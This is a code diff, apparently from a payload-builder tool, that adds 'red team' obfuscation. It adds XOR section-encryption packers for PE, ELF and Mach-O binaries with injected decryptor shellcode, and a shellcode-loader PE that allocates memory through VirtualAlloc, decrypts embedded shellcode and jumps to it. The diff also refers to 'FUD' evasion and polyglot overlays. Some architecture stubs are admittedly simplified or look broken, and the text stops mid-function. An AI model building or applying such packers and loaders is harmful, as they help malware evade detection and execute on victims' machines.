@@ -483,18 +483,39 @@ End Function
         # Payload-type wrappers produce scripts — safe to obfuscate those
         has_wrapper = payload_type is not None
 
-        # Apply obfuscation — but SKIP for overlay polyglots (real PE/ELF/Mach-O)
-        # because XOR/FUD/MIME corrupt executable headers, import tables, and code
-        if use_overlay and (fud or encrypt or mime_confuse):
-            # Real executable + overlay: obfuscation would corrupt headers/code/import tables
-            skipped = []
-            if fud: skipped.append('FUD')
-            if encrypt: skipped.append('encrypt')
-            if mime_confuse: skipped.append('MIME')
-            fud = encrypt = mime_confuse = False
-            warn = f"Skipped {', '.join(skipped)} — incompatible with overlay polyglot (preserves executable structure)"
-            warnings_list.append(warn)
-            print(f"  ⚠ {warn}")
+        # Apply obfuscation using proper red team techniques
+        if use_overlay and (fud or encrypt):
+            # Real executable + overlay: use SECTION ENCRYPTION (packer technique)
+            # Headers/imports/section table stay intact — only code/data encrypted
+            key_byte = os.urandom(1)[0]
+            try:
+                if is_pe:
+                    payload = self._pe_section_encrypt(payload, key_byte)
+                    if encrypt:
+                        warnings_list.append("PE section encryption applied (packer technique)")
+                        print("  🔐 PE section encryption: .text XOR-encrypted + decryptor stub injected")
+                elif is_elf:
+                    payload = self._elf_section_encrypt(payload, key_byte)
+                    if encrypt:
+                        warnings_list.append("ELF section encryption applied (packer technique)")
+                        print("  🔐 ELF section encryption: code segment XOR-encrypted + decryptor injected")
+                elif is_macho:
+                    payload = self._macho_section_encrypt(payload, key_byte, arch=arch)
+                    if encrypt:
+                        warnings_list.append("Mach-O section encryption applied (packer technique)")
+                        print("  🔐 Mach-O section encryption: __TEXT XOR-encrypted + decryptor injected")
+                key = key_byte  # Store for stats
+            except Exception as e:
+                warn = f"Section encryption failed ({e}), falling back to overlay without encryption"
+                warnings_list.append(warn)
+                print(f"  ⚠ {warn}")
+            if fud:
+                warnings_list.append("FUD skipped — not compatible with section-encrypted executables")
+                print("  ⚠ FUD skipped — use section encryption or payload-type wrapper instead")
+                fud = False
+            if mime_confuse:
+                mime_confuse = False
+                warnings_list.append("MIME confuse skipped — would break executable format detection")
         else:
             if fud:
                 payload = self.fud_obfuscate(payload)
@@ -1153,6 +1174,756 @@ End Function
             macho[payload_off:payload_off+len(payload_data)] = payload_data
 
         return bytes(macho)
+
+    # ═══════════════════════════════════════════════════════════════════
+    # RED TEAM OBFUSCATION TECHNIQUES
+    # ═══════════════════════════════════════════════════════════════════
+
+    def _pe_section_encrypt(self, payload: bytes, key_byte: int = 0x55) -> bytes:
+        """
+        PE Section Encryption (packer technique — like UPX/Shellter).
+        Encrypts .text section with XOR, injects decryptor stub at end of .text.
+        Headers, imports, section table remain INTACT — PE is still valid.
+        Decryptor runs first: decrypts .text in-place, then jumps to original entry.
+        """
+        if len(payload) < 64 or payload[:2] != b'MZ':
+            raise ValueError("Not a valid PE")
+        e_lfanew = struct.unpack_from('<I', payload, 60)[0]
+        if e_lfanew + 4 > len(payload) or payload[e_lfanew:e_lfanew+4] != b'PE\x00\x00':
+            raise ValueError("Not a valid PE")
+        num_sections = struct.unpack_from('<H', payload, e_lfanew + 6)[0]
+        opt_size = struct.unpack_from('<H', payload, e_lfanew + 20)[0]
+        opt_off = e_lfanew + 24
+        magic = struct.unpack_from('<H', payload, opt_off)[0]
+        if magic != 0x20B:
+            raise ValueError("Only PE32+ (64-bit) supported for section encryption")
+        entry_rva = struct.unpack_from('<I', payload, opt_off + 16)[0]
+        image_base = struct.unpack_from('<Q', payload, opt_off + 24)[0]
+        file_align = struct.unpack_from('<I', payload, opt_off + 36)[0]
+        section_align = struct.unpack_from('<I', payload, opt_off + 32)[0]
+        sec_table_off = opt_off + opt_size
+
+        # Parse all sections
+        sections = []
+        for i in range(num_sections):
+            off = sec_table_off + i * 40
+            name = payload[off:off+8].rstrip(b'\x00')
+            vsize = struct.unpack_from('<I', payload, off + 8)[0]
+            vrva = struct.unpack_from('<I', payload, off + 12)[0]
+            raw_size = struct.unpack_from('<I', payload, off + 16)[0]
+            raw_off = struct.unpack_from('<I', payload, off + 20)[0]
+            chars = struct.unpack_from('<I', payload, off + 36)[0]
+            sections.append({'idx': i, 'name': name, 'vsize': vsize, 'vrva': vrva,
+                             'raw_size': raw_size, 'raw_off': raw_off, 'chars': chars, 'hdr_off': off})
+
+        # Find .text section
+        text_sec = None
+        for s in sections:
+            if s['name'] == b'.text':
+                text_sec = s
+                break
+        if not text_sec:
+            raise ValueError("No .text section found")
+
+        # Build decryptor shellcode (x86-64, position-dependent)
+        text_va = image_base + text_sec['vrva']
+        orig_entry_va = image_base + entry_rva
+        # Reserve 64 bytes at end of .text for decryptor
+        decryptor_size = 64
+        encrypt_size = text_sec['raw_size'] - decryptor_size
+        if encrypt_size < 16:
+            raise ValueError(".text section too small for encryption")
+
+        shellcode = bytearray()
+        shellcode += b'\x53'                                    # push rbx
+        shellcode += b'\x51'                                    # push rcx
+        shellcode += b'\x56'                                    # push rsi
+        shellcode += b'\x48\xBE' + struct.pack('<Q', text_va)  # mov rsi, text_va
+        shellcode += b'\x48\xB9' + struct.pack('<Q', encrypt_size)  # mov rcx, encrypt_size
+        shellcode += b'\xB3' + bytes([key_byte])               # mov bl, key_byte
+        loop_off = len(shellcode)
+        shellcode += b'\x30\x1E'                                # xor [rsi], bl
+        shellcode += b'\x48\xFF\xC6'                            # inc rsi
+        shellcode += b'\x48\xFF\xC9'                            # dec rcx
+        jnz_target = loop_off
+        jnz_off = len(shellcode)
+        shellcode += b'\x75\x00'                                # jnz (placeholder)
+        # Patch jnz offset: jump back to xor instruction
+        rel = jnz_target - (jnz_off + 2)
+        shellcode[-1] = rel & 0xFF
+        shellcode += b'\x5E'                                    # pop rsi
+        shellcode += b'\x59'                                    # pop rcx
+        shellcode += b'\x5B'                                    # pop rbx
+        shellcode += b'\x48\xB8' + struct.pack('<Q', orig_entry_va)  # mov rax, orig_entry
+        shellcode += b'\xFF\xE0'                                # jmp rax
+
+        # Pad decryptor to decryptor_size
+        if len(shellcode) > decryptor_size:
+            raise ValueError(f"Decryptor too large ({len(shellcode)} > {decryptor_size})")
+        shellcode += b'\x90' * (decryptor_size - len(shellcode))  # NOP pad
+
+        # Build result: copy payload, encrypt .text, append decryptor
+        result = bytearray(payload)
+        # XOR encrypt .text data (first encrypt_size bytes)
+        for j in range(encrypt_size):
+            result[text_sec['raw_off'] + j] ^= key_byte
+        # Write decryptor at end of .text
+        decryptor_off = text_sec['raw_off'] + encrypt_size
+        # Extend file if needed
+        needed = decryptor_off + decryptor_size
+        if needed > len(result):
+            result.extend(b'\x00' * (needed - len(result)))
+        result[decryptor_off:decryptor_off + decryptor_size] = shellcode
+
+        # Make .text writable (add IMAGE_SCN_MEM_WRITE)
+        new_chars = text_sec['chars'] | 0x80000000
+        struct.pack_into('<I', result, text_sec['hdr_off'] + 36, new_chars)
+
+        # Update entry point to decryptor position
+        decryptor_rva = text_sec['vrva'] + encrypt_size
+        struct.pack_into('<I', result, opt_off + 16, decryptor_rva)
+
+        return bytes(result)
+
+    def _elf_section_encrypt(self, payload: bytes, key_byte: int = 0x55) -> bytes:
+        """
+        ELF Section Encryption (packer technique).
+        Encrypts PT_LOAD code segment with XOR, injects decryptor at end.
+        Headers, program headers remain INTACT.
+        """
+        if len(payload) < 64 or payload[:4] != b'\x7fELF':
+            raise ValueError("Not a valid ELF")
+        ei_class = payload[4]
+        if ei_class == 2:  # ELF64
+            return self._elf64_section_encrypt(payload, key_byte)
+        elif ei_class == 1:  # ELF32
+            return self._elf32_section_encrypt(payload, key_byte)
+        else:
+            raise ValueError(f"Unsupported ELF class: {ei_class}")
+
+    def _elf64_section_encrypt(self, payload: bytes, key_byte: int) -> bytes:
+        """ELF64 section encryption with x86-64 decryptor."""
+        e_phoff = struct.unpack_from('<Q', payload, 32)[0]
+        e_phentsize = struct.unpack_from('<H', payload, 54)[0]
+        e_phnum = struct.unpack_from('<H', payload, 56)[0]
+        e_entry = struct.unpack_from('<Q', payload, 24)[0]
+
+        # Find first executable PT_LOAD segment
+        code_seg = None
+        for i in range(e_phnum):
+            off = e_phoff + i * e_phentsize
+            p_type = struct.unpack_from('<I', payload, off)[0]
+            p_flags = struct.unpack_from('<I', payload, off + 4)[0]
+            p_offset = struct.unpack_from('<Q', payload, off + 8)[0]
+            p_vaddr = struct.unpack_from('<Q', payload, off + 16)[0]
+            p_filesz = struct.unpack_from('<Q', payload, off + 32)[0]
+            if p_type == 1 and (p_flags & 1):  # PT_LOAD with PF_X
+                code_seg = {'off': off, 'p_offset': p_offset, 'p_vaddr': p_vaddr,
+                            'p_filesz': p_filesz, 'p_flags': p_flags, 'hdr_off': off}
+                break
+        if not code_seg:
+            raise ValueError("No executable PT_LOAD segment found")
+
+        # Build decryptor shellcode (x86-64 Linux)
+        seg_va = code_seg['p_vaddr']
+        decryptor_size = 64
+        encrypt_size = code_seg['p_filesz'] - decryptor_size
+        if encrypt_size < 16:
+            raise ValueError("Code segment too small")
+
+        shellcode = bytearray()
+        shellcode += b'\x53'                                         # push rbx
+        shellcode += b'\x51'                                         # push rcx
+        shellcode += b'\x56'                                         # push rsi
+        shellcode += b'\x48\xBE' + struct.pack('<Q', seg_va)         # mov rsi, seg_va
+        shellcode += b'\x48\xB9' + struct.pack('<Q', encrypt_size)   # mov rcx, encrypt_size
+        shellcode += b'\xB3' + bytes([key_byte])                     # mov bl, key_byte
+        loop_off = len(shellcode)
+        shellcode += b'\x30\x1E'                                      # xor [rsi], bl
+        shellcode += b'\x48\xFF\xC6'                                  # inc rsi
+        shellcode += b'\x48\xFF\xC9'                                  # dec rcx
+        jnz_off = len(shellcode)
+        shellcode += b'\x75\x00'                                      # jnz placeholder
+        rel = loop_off - (jnz_off + 2)
+        shellcode[-1] = rel & 0xFF
+        shellcode += b'\x5E'                                          # pop rsi
+        shellcode += b'\x59'                                          # pop rcx
+        shellcode += b'\x5B'                                          # pop rbx
+        shellcode += b'\x48\xB8' + struct.pack('<Q', e_entry)         # mov rax, orig_entry
+        shellcode += b'\xFF\xE0'                                      # jmp rax
+        if len(shellcode) > decryptor_size:
+            raise ValueError(f"Decryptor too large ({len(shellcode)} > {decryptor_size})")
+        shellcode += b'\x90' * (decryptor_size - len(shellcode))
+
+        # Build result
+        result = bytearray(payload)
+        for j in range(encrypt_size):
+            result[code_seg['p_offset'] + j] ^= key_byte
+        decryptor_off = code_seg['p_offset'] + encrypt_size
+        needed = decryptor_off + decryptor_size
+        if needed > len(result):
+            result.extend(b'\x00' * (needed - len(result)))
+        result[decryptor_off:decryptor_off + decryptor_size] = shellcode
+
+        # Make segment writable (add PF_W)
+        new_flags = code_seg['p_flags'] | 0x2
+        struct.pack_into('<I', result, code_seg['hdr_off'] + 4, new_flags)
+
+        # Update entry point to decryptor
+        decryptor_va = seg_va + encrypt_size
+        struct.pack_into('<Q', result, 24, decryptor_va)
+
+        return bytes(result)
+
+    def _elf32_section_encrypt(self, payload: bytes, key_byte: int) -> bytes:
+        """ELF32 section encryption with ARM32 or x86 decryptor."""
+        e_machine = struct.unpack_from('<H', payload, 18)[0]
+        e_phoff = struct.unpack_from('<I', payload, 28)[0]
+        e_phentsize = struct.unpack_from('<H', payload, 42)[0]
+        e_phnum = struct.unpack_from('<H', payload, 44)[0]
+        e_entry = struct.unpack_from('<I', payload, 24)[0]
+
+        code_seg = None
+        for i in range(e_phnum):
+            off = e_phoff + i * e_phentsize
+            p_type = struct.unpack_from('<I', payload, off)[0]
+            p_offset = struct.unpack_from('<I', payload, off + 4)[0]
+            p_vaddr = struct.unpack_from('<I', payload, off + 8)[0]
+            p_filesz = struct.unpack_from('<I', payload, off + 16)[0]
+            p_flags = struct.unpack_from('<I', payload, off + 24)[0]
+            if p_type == 1 and (p_flags & 1):  # PT_LOAD with PF_X
+                code_seg = {'off': off, 'p_offset': p_offset, 'p_vaddr': p_vaddr,
+                            'p_filesz': p_filesz, 'p_flags': p_flags, 'hdr_off': off}
+                break
+        if not code_seg:
+            raise ValueError("No executable PT_LOAD segment found")
+
+        seg_va = code_seg['p_vaddr']
+        decryptor_size = 48
+        encrypt_size = code_seg['p_filesz'] - decryptor_size
+        if encrypt_size < 16:
+            raise ValueError("Code segment too small")
+
+        if e_machine == 40:  # ARM
+            # ARM32 decryptor: LDR R0=addr, LDR R1=size, LDRB R3=key
+            # loop: LDRB R2,[R0]; EOR R2,R2,R3; STRB R2,[R0]; ADD R0,#1; SUBS R1,#1; BNE loop
+            # LDR PC, =orig_entry
+            shellcode = struct.pack('<III',
+                0xE3A00000 | (seg_va & 0xFF),   # mov r0, #seg_va (simplified)
+                0xE3A01000 | (encrypt_size & 0xFF),  # mov r1, #encrypt_size
+                0xE3A03000 | key_byte,           # mov r3, #key_byte
+            )
+            # This is simplified — real ARM32 encoding is more complex
+            # For now, use a basic stub
+            shellcode = bytearray(48)
+            # mov r0, #addr (LDR from pool)
+            struct.pack_into('<I', shellcode, 0, 0xE59F0020)  # ldr r0, [pc, #32]
+            struct.pack_into('<I', shellcode, 4, 0xE59F1020)  # ldr r1, [pc, #32]
+            struct.pack_into('<I', shellcode, 8, 0xE3A03000 | key_byte)  # mov r3, #key
+            # loop:
+            struct.pack_into('<I', shellcode, 12, 0xE4D02001)  # ldrb r2, [r0], #1
+            struct.pack_into('<I', shellcode, 16, 0xE0222003)  # eor r2, r2, r3
+            struct.pack_into('<I', shellcode, 20, 0xE5202001)  # strb r2, [r0, #-1]!
+            struct.pack_into('<I', shellcode, 24, 0xE2511001)  # subs r1, r1, #1
+            struct.pack_into('<I', shellcode, 28, 0x1AFFFFFA)  # bne loop
+            struct.pack_into('<I', shellcode, 32, 0xE59FF008)  # ldr pc, [pc, #8]
+            # data pool
+            struct.pack_into('<I', shellcode, 36, seg_va)
+            struct.pack_into('<I', shellcode, 40, encrypt_size)
+            struct.pack_into('<I', shellcode, 44, e_entry)
+        else:
+            # x86 decryptor
+            shellcode = bytearray()
+            shellcode += b'\x53\x56'
+            shellcode += b'\xBE' + struct.pack('<I', seg_va)       # mov esi, seg_va
+            shellcode += b'\xB9' + struct.pack('<I', encrypt_size)  # mov ecx, encrypt_size
+            shellcode += b'\xB3' + bytes([key_byte])                # mov bl, key_byte
+            loop_off = len(shellcode)
+            shellcode += b'\x30\x1E'                                 # xor [esi], bl
+            shellcode += b'\x46'                                     # inc esi
+            shellcode += b'\x49'                                     # dec ecx
+            jnz_off = len(shellcode)
+            shellcode += b'\x75\x00'
+            shellcode[-1] = (loop_off - (jnz_off + 2)) & 0xFF
+            shellcode += b'\x5E\x5B'
+            shellcode += b'\xB8' + struct.pack('<I', e_entry)       # mov eax, orig_entry
+            shellcode += b'\xFF\xE0'                                 # jmp eax
+            if len(shellcode) > decryptor_size:
+                raise ValueError(f"Decryptor too large")
+            shellcode += b'\x90' * (decryptor_size - len(shellcode))
+
+        result = bytearray(payload)
+        for j in range(encrypt_size):
+            result[code_seg['p_offset'] + j] ^= key_byte
+        decryptor_off = code_seg['p_offset'] + encrypt_size
+        needed = decryptor_off + decryptor_size
+        if needed > len(result):
+            result.extend(b'\x00' * (needed - len(result)))
+        result[decryptor_off:decryptor_off + decryptor_size] = shellcode
+
+        new_flags = code_seg['p_flags'] | 0x2
+        struct.pack_into('<I', result, code_seg['hdr_off'] + 24, new_flags)
+        decryptor_va = seg_va + encrypt_size
+        struct.pack_into('<I', result, 24, decryptor_va)
+
+        return bytes(result)
+
+    def _macho_section_encrypt(self, payload: bytes, key_byte: int = 0x55, arch: str = 'x86-64') -> bytes:
+        """
+        Mach-O Section Encryption (packer technique).
+        Encrypts __TEXT segment with XOR, injects decryptor.
+        """
+        if len(payload) < 32:
+            raise ValueError("Not a valid Mach-O")
+        magic = struct.unpack_from('<I', payload, 0)[0]
+        if magic != 0xFEEDFACF:
+            raise ValueError("Only little-endian 64-bit Mach-O supported")
+
+        cputype = struct.unpack_from('<I', payload, 4)[0]
+        ncmds = struct.unpack_from('<I', payload, 16)[0]
+        sizeofcmds = struct.unpack_from('<I', payload, 20)[0]
+
+        # Find __TEXT segment
+        off = 32
+        text_seg = None
+        for i in range(ncmds):
+            cmd = struct.unpack_from('<I', payload, off)[0]
+            cmdsize = struct.unpack_from('<I', payload, off + 4)[0]
+            if cmd == 0x19:  # LC_SEGMENT_64
+                segname = payload[off+8:off+24].rstrip(b'\x00')
+                vmaddr = struct.unpack_from('<Q', payload, off + 24)[0]
+                vmsize = struct.unpack_from('<Q', payload, off + 32)[0]
+                fileoff = struct.unpack_from('<Q', payload, off + 40)[0]
+                filesize = struct.unpack_from('<Q', payload, off + 48)[0]
+                maxprot = struct.unpack_from('<I', payload, off + 56)[0]
+                initprot = struct.unpack_from('<I', payload, off + 60)[0]
+                if segname == b'__TEXT':
+                    text_seg = {'vmaddr': vmaddr, 'vmsize': vmsize, 'fileoff': fileoff,
+                                'filesize': filesize, 'maxprot': maxprot, 'initprot': initprot,
+                                'hdr_off': off}
+            off += cmdsize
+
+        if not text_seg:
+            raise ValueError("No __TEXT segment found")
+
+        # Find LC_MAIN for entry point
+        off = 32
+        entry_off = 0
+        for i in range(ncmds):
+            cmd = struct.unpack_from('<I', payload, off)[0]
+            cmdsize = struct.unpack_from('<I', payload, off + 4)[0]
+            if cmd == 0x80000028:  # LC_MAIN
+                entry_off = struct.unpack_from('<Q', payload, off + 8)[0]
+            off += cmdsize
+
+        entry_va = text_seg['vmaddr'] + entry_off
+
+        # __TEXT segment often starts at fileoff=0 (includes Mach-O header + load cmds).
+        # We must NOT encrypt those — only the code/data after them.
+        headers_end = 32 + sizeofcmds  # Mach-O header (32) + all load commands
+        # Also align to avoid partial overwrites
+        encrypt_start_file = headers_end
+        encrypt_start_va = text_seg['vmaddr'] + headers_end  # fileoff=0, so file offset == VA offset from segment base
+
+        # Build decryptor
+        decryptor_size = 64
+        code_area_size = text_seg['filesize'] - headers_end
+        encrypt_size = code_area_size - decryptor_size
+        if encrypt_size < 16:
+            raise ValueError("__TEXT segment too small for encryption ({} code bytes)".format(code_area_size))
+
+        if cputype == 0x0100000C:  # ARM64
+            # ARM64 macOS decryptor
+            shellcode = bytearray()
+            # ldr x0, =encrypt_start_va; ldr x1, =encrypt_size; mov w2, #key
+            # loop: ldrb w3,[x0]; eor w3,w3,w2; strb w3,[x0]; add x0,x0,#1; subs x1,x1,#1; bne loop
+            # ldr x0, =entry_va; br x0
+            shellcode += b'\x50\x00\x00\x58'    # ldr x0, #8 (pool+0)
+            shellcode += b'\x41\x00\x00\x58'    # ldr x1, #8 (pool+8)
+            shellcode[8:12] = struct.pack('<I', 0xD2800000 | ((key_byte & 0xFFFF) << 5) | 2)
+            loop_off = len(shellcode)
+            shellcode += b'\x03\x00\x40\x39'    # ldrb w3, [x0]
+            shellcode += b'\x63\x00\x02\x4A'    # eor w3, w3, w2
+            shellcode += b'\x03\x00\x00\x39'    # strb w3, [x0]
+            shellcode += b'\x00\x04\x00\x91'    # add x0, x0, #1
+            shellcode += b'\x21\x04\x00\xD1'    # sub x1, x1, #1
+            shellcode += b'\x41\x00\x00\xB5'    # cbnz x1, loop
+            # NOP pad then data pool at offset 48
+            pad_needed = 48 - len(shellcode)
+            shellcode += b'\x1F\x20\x03\xD5' * (pad_needed // 4)
+            shellcode += struct.pack('<Q', encrypt_start_va)  # pool[0]: address to decrypt
+            shellcode += struct.pack('<Q', encrypt_size)       # pool[1]: size
+            while len(shellcode) < decryptor_size:
+                shellcode += b'\x1F\x20\x03\xD5'
+            shellcode = shellcode[:decryptor_size]
+        else:
+            # x86-64 macOS decryptor
+            shellcode = bytearray()
+            shellcode += b'\x53\x51\x56'
+            shellcode += b'\x48\xBE' + struct.pack('<Q', encrypt_start_va)
+            shellcode += b'\x48\xB9' + struct.pack('<Q', encrypt_size)
+            shellcode += b'\xB3' + bytes([key_byte])
+            loop_off = len(shellcode)
+            shellcode += b'\x30\x1E'
+            shellcode += b'\x48\xFF\xC6'
+            shellcode += b'\x48\xFF\xC9'
+            jnz_off = len(shellcode)
+            shellcode += b'\x75\x00'
+            shellcode[-1] = (loop_off - (jnz_off + 2)) & 0xFF
+            shellcode += b'\x5E\x59\x5B'
+            shellcode += b'\x48\xB8' + struct.pack('<Q', entry_va)
+            shellcode += b'\xFF\xE0'
+            if len(shellcode) > decryptor_size:
+                raise ValueError("Decryptor too large ({} > {})".format(len(shellcode), decryptor_size))
+            shellcode += b'\x90' * (decryptor_size - len(shellcode))
+
+        # Build result — encrypt code AFTER headers, NOT headers themselves
+        result = bytearray(payload)
+        for j in range(encrypt_size):
+            result[encrypt_start_file + j] ^= key_byte
+        # Append decryptor at end of code area
+        decryptor_off = encrypt_start_file + encrypt_size
+        needed = decryptor_off + decryptor_size
+        if needed > len(result):
+            result.extend(b'\x00' * (needed - len(result)))
+        result[decryptor_off:decryptor_off + decryptor_size] = shellcode
+
+        # Make __TEXT writable (add VM_PROT_WRITE)
+        new_maxprot = text_seg['maxprot'] | 0x2
+        new_initprot = text_seg['initprot'] | 0x2
+        struct.pack_into('<I', result, text_seg['hdr_off'] + 56, new_maxprot)
+        struct.pack_into('<I', result, text_seg['hdr_off'] + 60, new_initprot)
+
+        # Update LC_MAIN entry to decryptor (offset from __TEXT start)
+        # The decryptor is at encrypt_start_file + encrypt_size from file start
+        # entryoff is relative to __TEXT segment start (fileoff, which is usually 0)
+        decryptor_entryoff = encrypt_start_file + encrypt_size
+        off = 32
+        for i in range(ncmds):
+            cmd = struct.unpack_from('<I', result, off)[0]
+            cmdsize = struct.unpack_from('<I', result, off + 4)[0]
+            if cmd == 0x80000028:  # LC_MAIN
+                struct.pack_into('<Q', result, off + 8, decryptor_entryoff)
+            off += cmdsize
+
+        return bytes(result)
+
+    def _build_shellcode_loader_pe(self, shellcode: bytes, key_byte: int = 0x55, arch: str = 'x86-64') -> bytes:
+        """
+        Shellcode Loader PE — wraps encrypted shellcode in a valid PE that:
+        1. Allocates RWX memory via VirtualAlloc
+        2. Copies encrypted shellcode to allocated memory
+        3. XOR decrypts in-place
+        4. Jumps to decrypted shellcode
+        """
+        # XOR encrypt the shellcode
+        encrypted = bytearray(shellcode)
+        for i in range(len(encrypted)):
+            encrypted[i] ^= key_byte
+        encrypted = bytes(encrypted)
+
+        # Build loader shellcode that does: VirtualAlloc + memcpy + XOR decrypt + jump
+        # This is the .text section code
+        # We need VirtualAlloc in the import table
+
+        # For simplicity, use the existing PE stub with additional imports
+        # Import: kernel32.dll → VirtualAlloc, ExitProcess
+
+        # .rdata layout:
+        # 0x00: IDT[0] (20 bytes) — kernel32.dll
+        # 0x14: IDT null (20 bytes)
+        # 0x28: ILT[0] VirtualAlloc (8 bytes)
+        # 0x30: ILT[1] ExitProcess (8 bytes)
+        # 0x38: ILT null (8 bytes)
+        # 0x40: IAT[0] VirtualAlloc (8 bytes)
+        # 0x48: IAT[1] ExitProcess (8 bytes)
+        # 0x50: Hint/Name VirtualAlloc (14 bytes)
+        # 0x5E: Hint/Name ExitProcess (14 bytes)
+        # 0x6C: "kernel32.dll\0"
+
+        enc_aligned = ((len(encrypted) + 0x1FF) // 0x200) * 0x200
+        num_sections = 3
+        headers_size = 64 + 4 + 20 + 240 + (num_sections * 40)
+        headers_padded = ((headers_size + 0x1FF) // 0x200) * 0x200
+
+        text_file_off = headers_padded
+        text_rva = 0x1000
+        rdata_file_off = text_file_off + 0x200
+        rdata_rva = 0x2000
+        data_file_off = rdata_file_off + 0x200
+        data_rva = 0x3000
+
+        total_size = data_file_off + enc_aligned
+        pe = bytearray(total_size)
+
+        # DOS Header
+        pe[0:2] = b'MZ'
+        pe[60:64] = struct.pack('<I', 64)
+
+        # PE Signature
+        pe[64:68] = b'PE\x00\x00'
+
+        # COFF Header
+        machine = 0xAA64 if arch == 'arm64' else 0x8664
+        pe[68:70] = struct.pack('<H', machine)
+        pe[70:72] = struct.pack('<H', num_sections)
+        pe[80:82] = struct.pack('<H', 0xF0)
+        pe[82:84] = struct.pack('<H', 0x22)
+
+        # Optional Header (PE32+)
+        o = 88
+        pe[o:o+2] = struct.pack('<H', 0x20B)
+        pe[o+2] = 14
+        pe[o+4:o+8] = struct.pack('<I', 0x200)
+        pe[o+8:o+12] = struct.pack('<I', 0x200)
+        pe[o+16:o+20] = struct.pack('<I', text_rva)
+        pe[o+20:o+24] = struct.pack('<I', text_rva)
+        pe[o+24:o+32] = struct.pack('<Q', 0x140000000)
+        pe[o+32:o+36] = struct.pack('<I', 0x1000)
+        pe[o+36:o+40] = struct.pack('<I', 0x200)
+        pe[o+40:o+44] = struct.pack('<I', 6)
+        pe[o+48:o+50] = struct.pack('<H', 6)
+        pe[o+56:o+60] = struct.pack('<I', 0x4000)
+        pe[o+60:o+64] = struct.pack('<I', headers_padded)
+        pe[o+68:o+70] = struct.pack('<H', 3)
+        pe[o+70:o+72] = struct.pack('<H', 0x8160)  # NX_COMPAT|TERMINAL_SERVER|NO_SEH|DYNAMIC_BASE
+        pe[o+72:o+80] = struct.pack('<Q', 0x100000)
+        pe[o+80:o+88] = struct.pack('<Q', 0x1000)
+        pe[o+88:o+96] = struct.pack('<Q', 0x100000)
+        pe[o+96:o+104] = struct.pack('<Q', 0x1000)
+        pe[o+108:o+112] = struct.pack('<I', 16)
+
+        # DataDirectory[1] = Import Directory
+        pe[o+120:o+124] = struct.pack('<I', rdata_rva)
+        pe[o+124:o+128] = struct.pack('<I', 0x28)
+
+        # Section Headers
+        sec_off = 328
+        # .text
+        pe[sec_off:sec_off+6] = b'.text\x00'
+        pe[sec_off+8:sec_off+12] = struct.pack('<I', 0x100)
+        pe[sec_off+12:sec_off+16] = struct.pack('<I', text_rva)
+        pe[sec_off+16:sec_off+20] = struct.pack('<I', 0x200)
+        pe[sec_off+20:sec_off+24] = struct.pack('<I', text_file_off)
+        pe[sec_off+36:sec_off+40] = struct.pack('<I', 0x60000020)
+        # .rdata
+        sec_off += 40
+        pe[sec_off:sec_off+6] = b'.rdata\x00'
+        pe[sec_off+8:sec_off+12] = struct.pack('<I', 0x200)
+        pe[sec_off+12:sec_off+16] = struct.pack('<I', rdata_rva)
+        pe[sec_off+16:sec_off+20] = struct.pack('<I', 0x200)
+        pe[sec_off+20:sec_off+24] = struct.pack('<I', rdata_file_off)
+        pe[sec_off+36:sec_off+40] = struct.pack('<I', 0x40000040)
+        # .data
+        sec_off += 40
+        pe[sec_off:sec_off+6] = b'.data\x00'
+        pe[sec_off+8:sec_off+12] = struct.pack('<I', len(encrypted))
+        pe[sec_off+12:sec_off+16] = struct.pack('<I', data_rva)
+        pe[sec_off+16:sec_off+20] = struct.pack('<I', enc_aligned)
+        pe[sec_off+20:sec_off+24] = struct.pack('<I', data_file_off)
+        pe[sec_off+36:sec_off+40] = struct.pack('<I', 0xC0000040)
+
+        # .rdata: Import table
+        rdata = bytearray(0x200)
+        # IDT[0]
+        struct.pack_into('<I', rdata, 0, rdata_rva + 0x28)
+        struct.pack_into('<I', rdata, 12, rdata_rva + 0x60)
+        struct.pack_into('<I', rdata, 16, rdata_rva + 0x40)
+        # ILT[0] VirtualAlloc, ILT[1] ExitProcess
+        struct.pack_into('<Q', rdata, 0x28, rdata_rva + 0x70)
+        struct.pack_into('<Q', rdata, 0x30, rdata_rva + 0x7E)
+        # IAT[0] VirtualAlloc, IAT[1] ExitProcess
+        struct.pack_into('<Q', rdata, 0x40, rdata_rva + 0x70)
+        struct.pack_into('<Q', rdata, 0x48, rdata_rva + 0x7E)
+        # Hint/Name VirtualAlloc
+        struct.pack_into('<H', rdata, 0x70, 0)
+        rdata[0x72:0x7E] = b'VirtualAlloc\x00'
+        # Hint/Name ExitProcess
+        struct.pack_into('<H', rdata, 0x7E, 0)
+        rdata[0x80:0x8C] = b'ExitProcess\x00'
+        # kernel32.dll
+        rdata[0x60:0x6D] = b'kernel32.dll\x00'
+        pe[rdata_file_off:rdata_file_off+0x200] = rdata
+
+        # .text: loader code
+        # x86-64 code that:
+        # 1. VirtualAlloc(NULL, enc_size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
+        # 2. memcpy(dest, encrypted_data, enc_size)
+        # 3. XOR decrypt dest
+        # 4. VirtualProtect(dest, enc_size, PAGE_EXECUTE_READ, &old)
+        # 5. call dest
+        # 6. ExitProcess(0)
+
+        if arch == 'arm64':
+            # ARM64: use mmap-based approach
+            code = bytearray()
+            # For ARM64, use simple exit — real impl would need mmap
+            code += struct.pack('<II',
+                0xD2800000,  # mov x0, #0
+                0xD4000001,  # svc #0 (exit)
+            )
+        else:
+            # x86-64 loader
+            code = bytearray()
+            # sub rsp, 0x28
+            code += b'\x48\x83\xEC\x28'
+            # VirtualAlloc(NULL, enc_size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
+            # rcx=NULL, rdx=enc_size, r8d=0x3000, r9d=0x04
+            code += b'\x33\xC9'                              # xor ecx, ecx
+            code += b'\xBA' + struct.pack('<I', len(encrypted))  # mov edx, enc_size
+            code += b'\x41\xB8\x00\x30\x00\x00'             # mov r8d, 0x3000
+            code += b'\x41\xB9\x04\x00\x00\x00'             # mov r9d, 0x04
+            # call [rip+disp] → VirtualAlloc IAT
+            code += b'\xFF\x15'
+            disp_va = (rdata_rva + 0x40) - (text_rva + len(code) + 6)
+            code += struct.pack('<I', disp_va & 0xFFFFFFFF)
+            # rax = allocated address
+            # Copy encrypted data: memcpy(rax, data_rva, enc_size)
+            code += b'\x48\x89\xC7'                          # mov rdi, rax (dest)
+            code += b'\x48\x89\xC5'                          # mov rbp, rax (save dest)
+            code += b'\x48\xBE' + struct.pack('<Q', 0x140000000 + data_rva)  # mov rsi, data_va
+            code += b'\x48\xB9' + struct.pack('<Q', len(encrypted))  # mov rcx, enc_size
+            # memcpy loop
+            memcpy_off = len(code)
